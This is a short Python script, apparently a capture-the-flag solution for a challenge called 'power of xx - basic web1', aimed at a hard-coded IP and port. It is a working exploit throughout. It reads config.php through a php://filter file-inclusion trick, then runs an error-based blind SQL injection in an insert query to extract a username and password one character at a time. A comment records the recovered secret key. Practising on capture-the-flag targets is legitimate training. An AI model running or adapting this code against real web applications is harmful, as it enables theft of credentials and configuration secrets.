#-*- coding:utf-8 -*-
import http.client, base64
from urllib.parse import quote

'''
power of xx - basic web1
blind insert injection
made by SiwooMun
'''

conn = http.client.HTTPConnection('125.131.189.15', 6001)
headers = {'Content-Type': 'application/x-www-form-urlencoded'}

conn.request('GET', '/?p=php://filter/convert.base64-encode/resource=config', '', headers)
secret_key = base64.b64decode(conn.getresponse().read()).decode('utf-8') # config.php

payload = (lambda col,x,y:",if((select substr(%s,%d,1) from users)=%s,(select 1 union select 2), 2))#"%(col,x,y))
quote_escape = 'email=a&title=a\&contents='
username = password = ""

for x in range(1, 6) : # extract username
	for y in "abcdefghijklmnopqrstuvwxyz0123456789" :
		body = quote_escape + quote(payload('username',x,str(hex(ord(y)))))
		conn.request('POST', '/send.htm', body, headers)
		response = str(conn.getresponse().read())

		if(response.find('err') != -1) :
			username += y
			print("username : " + username)
			break

for x in range(1, 15) : # extract password
	for y in "abcdefghijklmnopqrstuvwxyz0123456789" :
		body = quote_escape + quote(payload('password',x,str(hex(ord(y)))))
		conn.request('POST', '/send.htm', body, headers)
		response = str(conn.getresponse().read())

		if(response.find('err') != -1) :
			password += y
			print("password : " + password)
			break

conn.close()

print('----- config.php -----')
print(secret_key) # secret key : powerofxx
print('----------------------')
print('username : ' + username)
print('password : ' + password)
print('----------------------')